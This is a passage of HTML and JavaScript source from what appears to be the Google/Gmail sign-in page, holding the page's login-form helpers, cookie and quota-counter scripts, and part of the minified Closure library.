YvcsoIPCaWe5iMOf1zhbxq010l71AMbhfTJaAg+dE2jQbgNZI/Lw/blMEANopUfmaUfOQD+3EfXVMjPVHhX0hU8Nw0v2E/32UuSu3CQs+RlXn6YB0PG/BbBD7E7kncEmtVIvBHmd65fX5emrGWZMyPghoyo1h3bgxhJXFv24ODQ2RwRcTiWYV+/FrMMXwsUcnETvJ+Pv5NSIASBZSiHOO65WKGbCKcwxY0K0QMh6mboxWYq+GSl+v5wLleo1mX3mQsMLinLM/p+QlXF8L2wdZFy9nfmiXUO7EBUdESNaJulD78KD+UPLABbCPNvmTUQ2bwbW6f5djpw92CyOA0vNsQ86tP6TVNtkF8ccQuqU020t3exjIfNuOwQEhfXC+ii6n8/7eBnKtpVpEyqT3emeEJ8efKrLw58z3dGUVKKhshWtu7syn1ofLF3eL9zd40QZ9xqEU/fsPsCCJsHD+dAJ9ebgA9MADyJa+/PP7LqMdYvH14d35ByLxT0l2G/2aSCmXwxFrqxjDDNKG996E0/gsEHNMTrFLr+4qT+VwjtWMqEm7KMluzcC9NgB5NM51s9Yw8j/gETNVHhFFE/3kn7L6RDPNw/oBA5SkDuNSx2ppJY93TVkqmKQKv4VJBQSnHWjnPWCZp0efojaULGoaPKS1KQ05nPZo+b24z9AVzP0Glbg5xmsokVcsvsUfLyzS2ymco0bI5/DzZXvb3yUH9YwmS8GSa567LRAFcU36q+D/Q//W3loCVoVWf0x8Lyu0TR1cNF1Rb2CANPPdGRoVrQqFVvDtMNI517oVMmf3tcPm26GMWT9AMg5xugUAZvtdofKwNmnMh1uLSxieqcMeSkXWo6S5g9msQuKCPXCcvWCDRtNqTeroNHj/J/qIZlacUaRFlQgqB5inEwWkiRMIY+wVwW3iZb88fk2wHubB+u4BKix/iertZeCPJQmIPCR6SXdmkGJ1VG4ioBkgHc3zAvTT2nn3ERdzwckYhtlv0fYe7A8HCXvJXeda7hKbQC/C1s4uJPNs+Fcu5rGPnFyKgn3y9jZSf6uAw3OTkkD2JXVNC4omKJj7XZb5tSnue6LA8XNKz8H1e52H1Uc83eJHdJFxQDwiV2SAIWZVK2yC3Nh2Ddmg+/VppO4A50l/eApRqEcinnE0i5+PwKupuGO2LyKJqkEk21iAfZsqEHZPkjlMvUhL0gktZ7bgabV+2QDHO2hnOMXtjJZBwT/s1cg4RdUsCd/h5+U5+2KYsiRKw6CEph8hnIjItaDPeCsKYBeKOOII5MZ7y54523sSK+hPbtgnDR4iMvNiZvVtzDfpNzjpd5SKxkNv1Ng45EwTc+k3RWvG/yKIwMsK38SbOhg4RfkI7QvHqKqUIxaVw/ngaMK6+DWoZHpE3wBF89B62eZSLThuVPQw2n+81jnRUTxHngyfjxE9ws3OvbBA6/WQ3dcQQ+bh8Gv1VIBGCqkorf9jzqu6kCKJoNnT5b2hZim+lHI5yaAuZyvsXqEpLy6qsLXhjRel1p/worWih59rmI5nSEaCv6x37YZdQrXJ0CNumge9FXkVQx/PMepAnlH+Zs2k6bHa/lCiFbzg2Am9rhn3MdDZ+TRhVGsQm3/VH9X9PHi7+HtLQ+GgLDr6vFCkLIGp5EuY/c1tEDYq16R+vwgeUecuQpt2307LFpyb6KTL5I+wo6BiICB00FzRvq9HsLc55Ivn//IZWBQd8q9gBeD4gdtxJTj7qtUxxszI+qIFH9vzu0u7X5Zlhz60SdHLxq7dX7QqbUo80BeXz/YmOZ0BWwuIWKznV1HHFVZ1RQt/0t8keaXqzAK2+8f6w8QLxAb63dOigigGBS5+YiUIyKli4QZdxAWiPNcbGU7JH69YxlBlSLSTiejhDIAwgEbqf/TL5OWntxIjQIrX3ww8lgr4hKIKZ6ItQIxwUIKQ1drjciiXgbAXwqxp5c7IqzQFwV9muoJCEErXE4yDoQfZFYiqZ2V357p5WdbK/8SXkVOK49CaS7X8VR2wAMC0BjR/2TtTA53whu1LgvMQeAaNO/F9UsItveKXrfTfkmWIo02GFIKGt3PI8OG1WaC2CNrnHo3opKKD/eHfv+qz2g2Iqun1VuchRHJGLVP6/GytPTXqk1gr52qvGNTAxVI9WMHwQsXkESwduUHI4BkPTpTaY1Iabjs/ZU2lQdk9ncCq3jXY/FY3TrWJxxjtwfqXFbE0a0KOHmHMpPdkszJTntJOOmu4V/IZQBrE9EsMVyP8mfYxCOyechB4930gSDdct8O0rpXrffbUcR6bsp68YjXlQz2xvTZQp91h8O5UNMgpU1OqQzlHn1aYJs8tHIbR/WrECWY6OlLEMGHhtpFV94LMDSxYWdOxTs2ED9wovTPXW+5BQrVv0nNuCHBJXm3OiXtbzdJupO9FbDvDQpxD1HMiu3GrDCaLmvtaTCKLN5SHB5q4uj6cMJZEXVNEm/q0dPCR6x7Nc40CCF7QVZYHwwv5gtXSE/HQXBB5rxJ+VVCqQ5K1JZ+6Lvf+7YAaMf2Srv2GjFxdnW4iUww7xRVCN+Ayuimmsjiu/wNMYA20v30sECbTSByrJR0qYg6018bBeyPFdBDU6Yda5i0xUK1T7NzH0X1dHjFycHKZ7QSGuYv/KsiLW8AdjPmc24BSg+M8l8H1B2UCYJze3GzWzGfVKjazrBqw6JE3FUTMISyENEjQkZth4bLC9Qycs/UQT15uGtPwnVk5QH679HUTxIhiDRrKKx6qCj0d4LbqVmeTRTP2C05SfrAtW0xVaK4Omvdrcz4IBaxqcqWQtSgGFsLedxTfqtJczS6aSQ2ylYVRjp3RVJgYtfeYbL+muSXNCcxhX497rQGwvP+7F0tu+bR7ZibcuNbAYRvFzlcJWI2VhEUn7biXlimfIKo6xTmzJJ2Xpp2/Swj0iKLegZ5cMQUSu2HatsjxoDpIQFP4hOTy2DU/supKysN7VYooHDrW2VvAQCq9mnhP1u0iKrvos6ae9qow1DYwG67bujPe42+NvEPouVWH3bemDitt1p4s6XBKgE3hqpozuyVnNeL+9wHtHI3PXLQbw8MNHzCgoRQRIBz4jYzo90N1Ng/NdmWcQp5TBOMtj56TH5s6wJ1iHbRVlKPY7gOFg35kAOiy3E9+v2NznJEQbBpscveZnjJPEA4f/4eqJa9UxNthjLdhl0oEdma7OoPpKwbOUkQQ1Ma55C6e0nFZsX9++VSPhdVga6gPExOtPT9zd9MSQV3q1WBFGvTIuOjXz5PIdS6nRzM1K4pbmp6/3x1BRz+3KhZ2BADnNx4g0+klGYPLrUq1GJUoE/Yqf/w0ZO8c28zEQyN6x9v1dTlAL5Ataq40bdDUKEW4w5wyHeEneJTqjqSMQ6bKWHjcq+lSHbKs2VskDdzNBFeq1JzIekZZAw2aJrQ/aya8dkbmABfgH03eEJrp9VelftwNsW1DGHIndaMYRO+r+I/65n6pgMq8bEyIuWJy5oOXEqjegcu6awLxv3NF7DpHSuWTLa9tSUPxYyQMQxJ7Msfka8AIFva3DMrUNz+vYhpF94lVapQpfQf9I8g6/kr7XxvdAPacOZsPrHkn5Af9RDJcGMkQ/zFuK07MFxZqT9YWtpx/CUkDPhBn9vtpS4ziKOJ7XkAJPsyUvzj0HB3xRl6Pl82/tStcb1+laV8rOsDmkXUMhxPmXbMVg8voH1YexvZWZpagCjuKpnHzpduUs2P0A21DUExuZHxGWkscM3AZ6yLwN7/waxp5qT+Cp+J1plp7Rr0ilwsuj/baI65r+Poapizeg0XMc3VFX9WdZrzxeRW0dfQP8LAv4+G2StZRvInPAigAl6Qqh4i8lzjRCbagqRTrqjhz02h397Sp9WvWZb4HTmShEQ7W8hMY7OtBJ4Q3wMZgTnCYpKMbHYEWNiTxtkPDiYjjwLT/2x6/1ckFb2OqPhTlLmf/9gpu3mlWbwk7bXDtIiVX/8b+a9+r2X31I/SqbC+M8oLBCqlKLpLO5PB4JSUo3TX/bUhXAS4f0+U91QG4/Ap4B6jhlm6ziqP93e7wySe0cis4yCINEXGZXoQkOVh4BS1KbXSahmrk7iAT1vumaijRdHazx+I1hoazZmVxlDqXYsK8uIN/w6573oaWiDaCH2/SZUzz1HJ8axLksxYM8sIF4jA43X3hguRiCDGBHf/xOSpSUJvihGsYgaQv3y1MpkmlKUxXPmR8eFU1xNjdXv1OiVqPNbCE2jN5bMzgH87lGdp9a6CoPOIpzBuijytRXKwPEB3Mo5JCIuefSy+7cKelVsJug6WiKt2v/gfK+S2xKaA37Rf430ykuavjRRO4iIv8MZJEFBvkBVZgbbHACVtR3IG4GvXtt3Z34JLK6NOk1TbZ9ag==');
  </script>
<script>
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var email = null;
    if (document.getElementById) {
      email = document.getElementById('Email');
    }

    if ((email.value == null || email.value == '')
        && (email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script type="text/javascript">
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()
  </script>
<script type="text/javascript">
<!--

var start_time = (new Date()).getTime();

if (top.location != self.location) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.google.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1224486000000, 7254 ],
 [ 1335290400000, 7704 ],
 [ 1335376800000, 10240 ],
 [ 2144908800000, 13531 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota_elem;
var ONE_PX = "" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = '' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
var passwd_elem = el("Passwd");
if (passwd_elem) {
  passwd_elem.onfocus = MaybePingUser;
}
function OnLoad() {
  MaybePingUser();
  LogRoundtripTime();
  if (!quota_elem) {
  quota_elem = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota_elem) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000);
  } else if (i == CP.length) {
    quota_elem.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota_elem.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs);
    setTimeout(updateQuota, 1000);
  }
}

var PAD = '.000000';

function format(num) {
  var str = String(num);
  var dot = str.indexOf('.');
  if (dot < 0) {
     return str + PAD;
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var google_conversion_type = 'landing';
var google_conversion_id = 1069902127;
var google_conversion_language = "en_US";
var google_conversion_format = "1";
var google_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "";
}
// -->
</script>
<script>
gaia_attachEvent(window, 'load', function() {
  OnLoad();
  FixForm();
});
(function() {
  var gaiaLoginForm = document.getElementById('gaia_loginform');
  var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
  gaiaLoginForm.onsubmit = function() {
  lg();
  if (!fixed) {
  FixForm();
  }
  gaia_onsubmitHandler();
  };
})();
</script>
  <script>var PS_a,PS_aa=PS_aa||{},PS_b=this,PS_c=function(a){return void 0!==a},PS_ba=function(){},PS_d=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=
typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},PS_e=function(a){return"array"==PS_d(a)},PS_ca=function(a){var b=PS_d(a);return"array"==b||"object"==b&&"number"==typeof a.length},PS_f=function(a){return"string"==typeof a},PS_g=function(a){return"number"==typeof a},PS_h=function(a){var b=typeof a;return"object"==b&&null!=a||"function"==b},PS_da="closure_uid_"+
(1E9*Math.random()>>>0),PS_ea=0,PS_fa=function(a,b,c){return a.call.apply(a.bind,arguments)},PS_ga=function(a,b,c){if(!a)throw Error();if(2<arguments.length){var d=Array.prototype.slice.call(arguments,2);return function(){var c=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(c,d);return a.apply(b,c)}}return function(){return a.apply(b,arguments)}},PS_i=function(a,b,c){PS_i=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?PS_fa:PS_ga;return PS_i.apply(null,
arguments)},PS_ha=function(a,b){var c=Array.prototype.slice.call(arguments,1);return function(){var b=c.slice();b.push.apply(b,arguments);return a.apply(this,b)}},PS_j=Date.now||function(){return+new Date},PS_k=function(a,b){function c(){}c.prototype=b.prototype;a.A=b.prototype;a.prototype=new c;a.prototype.constructor=a;a.Ya=function(a,c,f){for(var g=Array(arguments.length-2),h=2;h<arguments.length;h++)g[h-2]=arguments[h];return b.prototype[c].apply(a,g)}};var PS_l=function(){this.L=this.L;this.D=this.D};PS_l.prototype.L=!1;PS_l.prototype.S=function(){this.L||(this.L=!0,this.m())};var PS_m=function(a,b){var c=PS_ha(PS_ia,b);a.L?c.call(void 0):(a.D||(a.D=[]),a.D.push(PS_c(void 0)?PS_i(c,void 0):c))};PS_l.prototype.m=function(){if(this.D)for(;this.D.length;)this.D.shift()()};var PS_ia=function(a){a&&"function"==typeof a.S&&a.S()};var PS_ja=function(a){if(Error.captureStackTrace)Error.captureStackTrace(this,PS_ja);else{var b=Error().stack;b&&(this.stack=b)}a&&(this.message=String(a))};PS_k(PS_ja,Error);PS_ja.prototype.name="CustomError";var PS_ka;var PS_la=function(a,b){for(var c=a.split("%s"),d="",e=Array.prototype.slice.call(arguments,1);e.length&&1<c.length;)d+=c.shift()+e.shift();return d+c.join("%s")},PS_ma=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")},PS_n=function(a){if(!PS_na.test(a))return a;-1!=a.indexOf("&")&&(a=a.replace(PS_oa,"&amp;"));-1!=a.indexOf("<")&&(a=a.replace(PS_pa,"&lt;"));-1!=a.indexOf(">")&&(a=a.replace(PS_qa,"&gt;"));-1!=a.indexOf('"')&&(a=a.replace(PS_ra,
"&quot;"));-1!=a.indexOf("'")&&(a=a.replace(PS_sa,"&#39;"));-1!=a.indexOf("\x00")&&(a=a.replace(PS_ta,"&#0;"));return a},PS_oa=/&/g,PS_pa=/</g,PS_qa=/>/g,PS_ra=/"/g,PS_sa=/'/g,PS_ta=/\x00/g,PS_na=/[\x00&<>"']/,PS_va=function(a,b){for(var c=0,d=PS_ma(String(a)).split("."),e=PS_ma(String(b)).split("."),f=Math.max(d.length,e.length),g=0;0==c&&g<f;g++){var h=d[g]||"",l=e[g]||"",k=RegExp("(\\d*)(\\D*)","g"),m=RegExp("(\\d*)(\\D*)","g");do{var n=k.exec(h)||["","",""],p=m.exec(l)||["","",""];if(0==n[0].length&&
0==p[0].length)break;c=PS_ua(0==n[1].length?0:parseInt(n[1],10),0==p[1].length?0:parseInt(p[1],10))||PS_ua(0==n[2].length,0==p[2].length)||PS_ua(n[2],p[2])}while(0==c)}return c},PS_ua=function(a,b){return a<b?-1:a>b?1:0},PS_wa=function(a){return String(a).replace(/\-([a-z])/g,function(a,c){return c.toUpperCase()})},PS_xa=function(a){var b=PS_f(void 0)?"undefined".replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g,"\\$1").replace(/\x08/g,"\\x08"):"\\s";return a.replace(new RegExp("(^"+(b?"|["+b+"]+":"")+")([a-z])",
"g"),function(a,b,e){return b+e.toUpperCase()})};var PS_ya=function(a,b){b.unshift(a);PS_ja.call(this,PS_la.apply(null,b));b.shift()};PS_k(PS_ya,PS_ja);PS_ya.prototype.name="AssertionError";
var PS_za=function(a,b,c,d){var e="Assertion failed";if(c)var e=e+(": "+c),f=d;else a&&(e+=": "+a,f=b);throw new PS_ya(""+e,f||[]);},PS_o=function(a,b,c){a||PS_za("",null,b,Array.prototype.slice.call(arguments,2));return a},PS_p=function(a,b){throw new PS_ya("Failure"+(a?": "+a:""),Array.prototype.slice.call(arguments,1));},PS_Aa=function(a,b,c){PS_f(a)||PS_za("Expected string but got %s: %s.",[PS_d(a),a],b,Array.prototype.slice.call(arguments,2));return a},PS_Ba=function(a,b,c){PS_h(a)||PS_za("Expected object but got %s: %s.",
[PS_d(a),a],b,Array.prototype.slice.call(arguments,2))},PS_Ca=function(a,b,c){PS_h(a)&&1==a.nodeType||PS_za("Expected Element but got %s: %s.",[PS_d(a),a],b,Array.prototype.slice.call(arguments,2));return a},PS_Ea=function(a,b,c,d){a instanceof b||PS_za("Expected instanceof %s but got %s.",[PS_Da(b),PS_Da(a)],c,Array.prototype.slice.call(arguments,3))},PS_Da=function(a){return a instanceof Function?a.displayName||a.name||"unknown type name":a instanceof Object?a.constructor.displayName||a.constructor.name||
Object.prototype.toString.call(a):null===a?"null":typeof a};var PS_Fa=function(a){PS_Fa[" "](a);return a};PS_Fa[" "]=PS_ba;var PS_Ga=function(a,b){try{return PS_Fa(a[b]),!0}catch(c){}return!1};var PS_Ha=Array.prototype.indexOf?function(a,b,c){PS_o(null!=a.length);return Array.prototype.indexOf.call(a,b,c)}:function(a,b,c){c=null==c?0:0>c?Math.max(0,a.length+c):c;if(PS_f(a))return PS_f(b)&&1==b.length?a.indexOf(b,c):-1;for(;c<a.length;c++)if(c in a&&a[c]===b)return c;return-1},PS_q=Array.prototype.forEach?function(a,b,c){PS_o(null!=a.length);Array.prototype.forEach.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=PS_f(a)?a.split(""):a,f=0;f<d;f++)f in e&&b.call(c,e[f],f,a)},PS_Ia=Array.prototype.filter?
function(a,b,c){PS_o(null!=a.length);return Array.prototype.filter.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=[],f=0,g=PS_f(a)?a.split(""):a,h=0;h<d;h++)if(h in g){var l=g[h];b.call(c,l,h,a)&&(e[f++]=l)}return e},PS_Ja=Array.prototype.map?function(a,b,c){PS_o(null!=a.length);return Array.prototype.map.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=Array(d),f=PS_f(a)?a.split(""):a,g=0;g<d;g++)g in f&&(e[g]=b.call(c,f[g],g,a));return e},PS_Ka=Array.prototype.some?function(a,b,c){PS_o(null!=
a.length);return Array.prototype.some.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=PS_f(a)?a.split(""):a,f=0;f<d;f++)if(f in e&&b.call(c,e[f],f,a))return!0;return!1},PS_Ma=function(a){var b;a:{b=PS_La;for(var c=a.length,d=PS_f(a)?a.split(""):a,e=0;e<c;e++)if(e in d&&b.call(void 0,d[e],e,a)){b=e;break a}b=-1}return 0>b?null:PS_f(a)?a.charAt(b):a[b]},PS_Na=function(a,b){var c=PS_Ha(a,b),d;if(d=0<=c)PS_o(null!=a.length),Array.prototype.splice.call(a,c,1);return d};var PS_Oa=function(a,b,c){for(var d in a)b.call(c,a[d],d,a)},PS_Pa=function(a){var b=[],c=0,d;for(d in a)b[c++]=a[d];return b},PS_Qa=function(a){var b=[],c=0,d;for(d in a)b[c++]=d;return b},PS_Ra=function(a){return null!==a&&"withCredentials"in a},PS_Sa="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" "),PS_Ta=function(a,b){for(var c,d,e=1;e<arguments.length;e++){d=arguments[e];for(c in d)a[c]=d[c];for(var f=0;f<PS_Sa.length;f++)c=PS_Sa[f],Object.prototype.hasOwnProperty.call(d,
c)&&(a[c]=d[c])}};var PS_r;a:{var PS_Ua=PS_b.navigator;if(PS_Ua){var PS_Va=PS_Ua.userAgent;if(PS_Va){PS_r=PS_Va;break a}}PS_r=""}var PS_=function(a){return-1!=PS_r.indexOf(a)};var PS_Wa=function(){return PS_("Opera")||PS_("OPR")},PS_Xa=function(){return(PS_("Chrome")||PS_("CriOS"))&&!PS_Wa()&&!PS_("Edge")};var PS_Ya=function(){return PS_("iPhone")&&!PS_("iPod")&&!PS_("iPad")};var PS_s=PS_Wa(),PS_t=PS_("Trident")||PS_("MSIE"),PS_Za=PS_("Edge"),PS__a=PS_Za||PS_t,PS_u=PS_("Gecko")&&!(-1!=PS_r.toLowerCase().indexOf("webkit")&&!PS_("Edge"))&&!(PS_("Trident")||PS_("MSIE"))&&!PS_("Edge"),PS_v=-1!=PS_r.toLowerCase().indexOf("webkit")&&!PS_("Edge"),PS_0a=PS_v&&PS_("Mobile"),PS_1a=PS_("Macintosh"),PS_2a=function(){var a=PS_r;if(PS_u)return/rv\:([^\);]+)(\)|;)/.exec(a);if(PS_Za)return/Edge\/([\d\.]+)/.exec(a);if(PS_t)return/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);if(PS_v)return/WebKit\/(\S+)/.exec(a)},
PS_3a=function(){var a=PS_b.document;return a?a.documentMode:void 0},PS_4a=function(){if(PS_s&&PS_b.opera){var a;var b=PS_b.opera.version;try{a=b()}catch(c){a=b}return a}a="";(b=PS_2a())&&(a=b?b[1]:"");return PS_t&&(b=PS_3a(),b>parseFloat(a))?String(b):a}(),PS_5a={},PS_w=function(a){return PS_5a[a]||(PS_5a[a]=0<=PS_va(PS_4a,a))},PS_6a=PS_b.document,PS_x=PS_6a&&PS_t?PS_3a()||("CSS1Compat"==PS_6a.compatMode?parseInt(PS_4a,10):5):void 0;var PS_7a=!PS_t||9<=PS_x,PS_8a=!PS_t||9<=PS_x,PS_9a=PS_t&&!PS_w("9");!PS_v||PS_w("528");PS_u&&PS_w("1.9b")||PS_t&&PS_w("8")||PS_s&&PS_w("9.5")||PS_v&&PS_w("528");PS_u&&!PS_w("8")||PS_t&&PS_w("9");var PS_y=function(a,b){this.type=a;this.a=this.target=b;this.Fa=!0};PS_y.prototype.preventDefault=function(){this.Fa=!1};var PS_$a=function(a,b){PS_y.call(this,a?a.type:"");this.a=this.target=null;this.keyCode=this.clientY=this.clientX=0;this.xa=!1;this.V=null;if(a){this.type=a.type;var c=a.changedTouches?a.changedTouches[0]:null;this.target=a.target||a.srcElement;this.a=b;var d=a.relatedTarget;d&&PS_u&&PS_Ga(d,"nodeName");null===c?(this.clientX=void 0!==a.clientX?a.clientX:a.pageX,this.clientY=void 0!==a.clientY?a.clientY:a.pageY):(this.clientX=void 0!==c.clientX?c.clientX:c.pageX,this.clientY=void 0!==c.clientY?c.clientY:
c.pageY);this.keyCode=a.keyCode||0;this.xa=a.ctrlKey;this.V=a;a.defaultPrevented&&this.preventDefault()}};PS_k(PS_$a,PS_y);var PS_ab=[1,4,2];PS_$a.prototype.preventDefault=function(){PS_$a.A.preventDefault.call(this);var a=this.V;if(a.preventDefault)a.preventDefault();else if(a.returnValue=!1,PS_9a)try{if(a.ctrlKey||112<=a.keyCode&&123>=a.keyCode)a.keyCode=-1}catch(b){}};var PS_bb="closure_listenable_"+(1E6*Math.random()|0),PS_cb=function(a){return!(!a||!a[PS_bb])},PS_db=0;var PS_eb=function(a,b,c,d,e){this.listener=a;this.a=null;this.src=b;this.type=c;this.ia=!!d;this.ka=e;this.na=++PS_db;this.$=this.ha=!1},PS_fb=function(a){a.$=!0;a.listener=null;a.a=null;a.src=null;a.ka=null};var PS_gb=function(a){this.src=a;this.a={};this.b=0},PS_ib=function(a,b,c,d,e,f){var g=b.toString();b=a.a[g];b||(b=a.a[g]=[],a.b++);var h=PS_hb(b,c,e,f);-1<h?(a=b[h],d||(a.ha=!1)):(a=new PS_eb(c,a.src,g,!!e,f),a.ha=d,b.push(a));return a},PS_jb=function(a,b){var c=b.type;c in a.a&&PS_Na(a.a[c],b)&&(PS_fb(b),0==a.a[c].length&&(delete a.a[c],a.b--))},PS_kb=function(a,b,c,d,e){a=a.a[b.toString()];b=-1;a&&(b=PS_hb(a,c,d,e));return-1<b?a[b]:null},PS_hb=function(a,b,c,d){for(var e=0;e<a.length;++e){var f=
a[e];if(!f.$&&f.listener==b&&f.ia==!!c&&f.ka==d)return e}return-1};var PS_lb="closure_lm_"+(1E6*Math.random()|0),PS_mb={},PS_nb=0,PS_ob=function(a,b,c,d,e){if(PS_e(b)){for(var f=0;f<b.length;f++)PS_ob(a,b[f],c,d,e);return null}c=PS_pb(c);PS_cb(a)?(PS_qb(a),a=PS_ib(a.C,String(b),c,!1,d,e)):a=PS_rb(a,b,c,!1,d,e);return a},PS_rb=function(a,b,c,d,e,f){if(!b)throw Error("Invalid event type");var g=!!e,h=PS_sb(a);h||(a[PS_lb]=h=new PS_gb(a));c=PS_ib(h,b,c,d,e,f);if(c.a)return c;d=PS_tb();c.a=d;d.src=a;d.listener=c;if(a.addEventListener)a.addEventListener(b.toString(),
d,g);else if(a.attachEvent)a.attachEvent(PS_ub(b.toString()),d);else throw Error("addEventListener and attachEvent are unavailable.");PS_nb++;return c},PS_tb=function(){var a=PS_vb,b=PS_8a?function(c){return a.call(b.src,b.listener,c)}:function(c){c=a.call(b.src,b.listener,c);if(!c)return c};return b},PS_wb=function(a,b,c,d,e){if(PS_e(b)){for(var f=0;f<b.length;f++)PS_wb(a,b[f],c,d,e);return null}c=PS_pb(c);return PS_cb(a)?PS_ib(a.C,String(b),c,!0,d,e):PS_rb(a,b,c,!0,d,e)},PS_xb=function(a,b,c,d,
e){if(PS_e(b))for(var f=0;f<b.length;f++)PS_xb(a,b[f],c,d,e);else c=PS_pb(c),PS_cb(a)?(a=a.C,b=String(b).toString(),b in a.a&&(f=a.a[b],c=PS_hb(f,c,d,e),-1<c&&(PS_fb(f[c]),PS_o(null!=f.length),Array.prototype.splice.call(f,c,1),0==f.length&&(delete a.a[b],a.b--)))):a&&(a=PS_sb(a))&&(c=PS_kb(a,b,c,!!d,e))&&PS_z(c)},PS_z=function(a){if(!PS_g(a)&&a&&!a.$){var b=a.src;if(PS_cb(b))PS_jb(b.C,a);else{var c=a.type,d=a.a;b.removeEventListener?b.removeEventListener(c,d,a.ia):b.detachEvent&&b.detachEvent(PS_ub(c),
